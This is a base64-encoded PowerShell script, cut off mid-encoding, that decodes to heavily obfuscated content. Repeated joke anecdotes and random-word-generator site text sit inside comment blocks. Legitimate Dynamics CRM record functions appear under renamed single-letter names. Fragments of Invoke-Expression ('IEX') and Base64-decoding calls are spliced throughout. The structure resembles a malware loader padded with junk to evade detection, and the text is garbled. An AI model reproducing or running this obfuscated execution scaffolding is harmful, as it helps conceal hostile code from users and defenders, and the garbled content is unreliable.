gYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGEoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gYnsKCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUEFSQU0oCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlKV0KICAgICAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1TZXJ2aWNlQ2xpZW50XSRjb25uLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lQW5kRmllbGRzIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVBbmRGaWVsZHMiKV0KICAgICAgICBbaGFzaHRhYmxlXSRGaWVsZHMsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kQ3JtUmVjb3JkLAoJW3BhcmFtZXRlcihNYW5kYXRvcnk9JGZhbHNlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJDcm1SZWNvcmQiKV0KICAgICAgICBbc3dpdGNoXSRQcmVzZXJ2ZUNybVJlY29yZElkCiAgICApCgoJJGNvbm4gPSBWZXJpZnlDcm1Db25uZWN0aW9uUGFyYW0gLWNvbm4gJGNvbm4gLXBpcGVsaW5lVmFsdWUgKCRQU0JvdW5kUGFyYW1ldGVycy5Db250YWluc0tleSgnY29ubicpKQoJCgogICAgJG5ld2ZpZWxkcyA9IE5ldy1PYmplY3QgJ1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkRpY3Rpb25hcnlbW1N0cmluZ10sIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybURhdGFUeXBlV3JhcHBlcl1dJwogICAgCiAgICBpZigkQ3JtUmVjb3JkIC1uZSAkbnVsbCkKICAgIHsKICAgICAgICAkRW50aXR5TG9naWNhbE5hbWUgPSAkQ3JtUmVjb3JkLlJldHVyblByb3BlcnR5X0VudGl0eU5hbWUKICAgICAgICAkYXR0cyA9IEdldC1Dcm1FbnRpdHlBdHRyaWJ1dGVzIC1jb25uICRjb25uIC1FbnRpdHlMb2dpY2FsTmFtZSAkRW50aXR5TG9naWNhbE5hbWUKICAgICAgICBmb3JlYWNoKCRjcm1GaWVsZEtleSBpbiAoJENybVJlY29yZCB8IEdldC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5KS5OYW1lKQogICAgICAgIHsKICAgICAgICAgICAgaWYoJGNybUZpZWxkS2V5LkVuZHNXaXRoKCJfUHJvcGVydHkiKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYoJENybVJlY29yZC5SZXR1cm5Qcm9wZXJ0eV9JZCAtZXEgJENybVJlY29yZC4kY3JtRmllbGRLZXkuVmFsdWUgLWFuZCAhJFByZXNlcnZlQ3JtUmVjb3JkSWQpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9ICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlbHNlaWYoKCRhdHRzIHwgPyBsb2dpY2FsbmFtZSAtZXEgJENybVJlY29yZC4kY3JtRmllbGRLZXkuS2V5KS5Jc1ZhbGlkRm9yQ3JlYXRlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICMgU29tZSBmaWVsZHMgY2Fubm90IGJlIGNyZWF0ZWQgZXZlbiB0aG91Z2ggaXQgaXMgc2V0IGFzIElzVmFsaWRGb3JDcmVhdGUKICAgICAgICAgICAgICAgICAgICBpZigkQ3JtUmVjb3JkLiRjcm1GaWVsZEtleS5LZXkuQ29udGFpbnMoImFkZHJlc3NpZCIpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdmaWVsZCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lICdNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybURhdGFUeXBlV3JhcHBlcicKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdmaWVsZC5UeXBlID0gTWFwRmllbGRUeXBlQnlGaWVsZFZhbHVlIC1WYWx1ZSAkQ3JtUmVjb3JkLiRjcm1GaWVsZEtleS5WYWx1ZSAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdmaWVsZC5WYWx1ZSA9ICRDcm1SZWNvcmQuJGNybUZpZWxkS2V5LlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICRuZXdmaWVsZHMuQWRkKCRDcm1SZWNvcmQuJGNybUZpZWxkS2V5LktleSwgJG5ld2ZpZWxkKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gIAogICAgfQogICAgZWxzZQogICAgewogICAgICAgIGZvcmVhY2goJGZpZWxkIGluICRGaWVsZHMuR2V0RW51bWVyYXRvcigpKQogICAgICAgIHsgIAogICAgICAgICAgICAkbmV3ZmllbGQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSAnTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1EYXRhVHlwZVdyYXBwZXInCiAgICAgICAgICAgIAogICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IE1hcEZpZWxkVHlwZUJ5RmllbGRWYWx1ZSAtVmFsdWUgJGZpZWxkLlZhbHVlCiAgICAgICAgICAgIAogICAgICAgICAgICAkbmV3ZmllbGQuVmFsdWUgPSAkZmllbGQuVmFsdWUKICAgICAgICAgICAgJG5ld2ZpZWxkcy5BZGQoJGZpZWxkLktleSwgJG5ld2ZpZWxkKQogICAgICAgIH0KICAgIH0KICAgIHRyeQogICAgeyAgICAgICAgCiAgICAgICAgJHJlc3VsdCA9ICRjb25uLkNyZWF0ZU5ld1JlY29yZCgkRW50aXR5TG9naWNhbE5hbWUsICRuZXdmaWVsZHMsICRudWxsLCAkZmFsc2UsIFtHdWlkXTo6RW1wdHkpCiAgICAgICAgaWYoISRyZXN1bHQgLW9yICRyZXN1bHQgLWVxIFtTeXN0ZW0uR3VpZF06OkVtcHR5KQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikKICAgICAgICB9CiAgICB9CiAgICBjYXRjaAogICAgewogICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICB9CgogICAgcmV0dXJuICRyZXN1bHQKfQo8Iz4+ClNwPWVsbGluZyBhbmQgVm9jYWJ1bGFyeQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSB2b2NhYnVsYXJ5IG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBhKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGEoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgZSgpIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGgoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgZygpIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYSgpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBjewoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEpXQogICAgICAgIFtzdHJpbmddJEVudGl0eUxvZ2ljYWxOYW1lLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yKV0KICAgICAgICBbZ3VpZF0kSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTMpXQogICAgICAgIFtzdHJpbmdbXV0kRmllbGRzLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUG9zaXRpb249NCldCiAgICAgICAgW3N3aXRjaF0kSW5jbHVkZU51bGxWYWx1ZQogICAgKQoKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKCiAgICBpZigkRmllbGRzIC1lcSAiKiIpCiAgICB7CiAgICAgICAgW0NvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtTdHJpbmddXSR4ID0gJG51bGwKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBbQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W1N0cmluZ11dJHggPSAkRmllbGRzCiAgICB9CgogICAgdHJ5CiAgICB7CiAgICAgICAgJHJlY29yZCA9ICRjb25uLkdldEVudGl0eURhdGFCeUlkKCRFbnRpdHlMb2dpY2FsTmFtZSwgJElkLCAkeCwgW0d1aWRdOjpFbXB0eSkKICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgdGhyb3cgTGFzdENybUNvbm5lY3RvckV4Y2VwdGlvbigkY29ubikgICAgICAgIAogICAgfSAKICAgIAogICAgaWYoJHJlY29yZCAtZXEgJG51bGwpCiAgICB7ICAgICAgICAKICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgfQogICAgICAgIAogICAgJHBzb2JqID0gQHsgfQogICAgJG1ldGEgPSBHZXQtQ3JtRW50aXR5TWV0YWRhdGEgLWNvbm4gJGNvbm4gLUVudGl0eUxvZ2ljYWxOYW1lICRFbnRpdHlMb2dpY2FsTmFtZSAtRW50aXR5RmlsdGVycyBBdHRyaWJ1dGVzCiAgICBpZigkSW5jbHVkZU51bGxWYWx1ZSkKICAgIHsKICAgICAgICBpZigkRmllbGRzIC1lcSAiKiIpCiAgICAgICAgewogICAgICAgICAgICAjIEFkZCBhbGwgZmllbGRzIGZpcnN0CiAgICAgICAgICAgIGZvcmVhY2goJGF0dE5hbWUgaW4gJG1ldGEuQXR0cmlidXRlcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKC1ub3QgJGF0dE5hbWUuSXNWYWxpZEZvclJlYWQpIHsgY29udGludWUgfQogICAgICAgICAgICAgICAgJHBzb2JqWyRhdHROYW1lLkxvZ2ljYWxOYW1lXSA9ICRudWxsCiAgICAgICAgICAgICAgICAkcHNvYmpbIiQoJGF0dE5hbWUuTG9naWNhbE5hbWUpX1Byb3BlcnR5Il0gPSAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIGZvcmVhY2goJGF0dE5hbWUgaW4gJEZpZWxkcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHBzb2JqWyRhdHROYW1lXSA9ICRudWxsCiAgICAgICAgICAgICAgICAkcHNvYmpbIiQoJGF0dE5hbWUpX1Byb3BlcnR5Il0gPSAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgICAgIAogICAgZm9yZWFjaCgkYXR0IGluICRyZWNvcmQuR2V0RW51bWVyYXRvcigpKQogICAgeyAgICAgICAKICAgICAgICBpZigkYXR0LlZhbHVlIC1pcyBbTWljcm9zb2Z0LlhybS5TZGsuRW50aXR5UmVmZXJlbmNlXSkKICAgICAgICB7CiAgICAgICAgICAgICRwc29ialskYXR0LktleV0gPSAkYXR0LlZhbHVlLk5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmKCRhdHQuVmFsdWUgLWlzIFtNaWNyb3NvZnQuWHJtLlNkay5BbGlhc2VkVmFsdWVdKQogICAgICAgIHsKICAgICAgICAgICAgJHBzb2JqWyRhdHQuS2V5XSA9ICRhdHQuVmFsdWUuVmFsdWUKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgJHBzb2JqWyRhdHQuS2V5XSA9ICRhdHQuVmFsdWUKICAgICAgICB9ICAgICAgICAgICAgICAgIAogICAgfSAgIAogICAgJHBzb2JqICs9IEB7CiAgICAgICAgb3JpZ2luYWwgPSAkcmVjb3JkCiAgICAgICAgbG9naWNhbG5hbWUgPSAkRW50aXR5TG9naWNhbE5hbWUKICAgICAgICBFbnRpdHlSZWZlcmVuY2UgPSBOZXctQ3JtRW50aXR5UmVmZXJlbmNlIC1FbnRpdHlMb2dpY2FsTmFtZSAkRW50aXR5TG9naWNhbE5hbWUgLUlkICRJZAogICAgICAgIFJldHVyblByb3BlcnR5X0VudGl0eU5hbWUgPSAkRW50aXR5TG9naWNhbE5hbWUKICAgICAgICBSZXR1cm5Qcm9wZXJ0eV9JZCA9ICRyZWNvcmQuKCRtZXRhLlByaW1hcnlJZEF0dHJpYnV0ZSkKICAgIH0KICAgIAogICAgW1BTQ3VzdG9tT2JqZWN0XSRwc29iagp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCB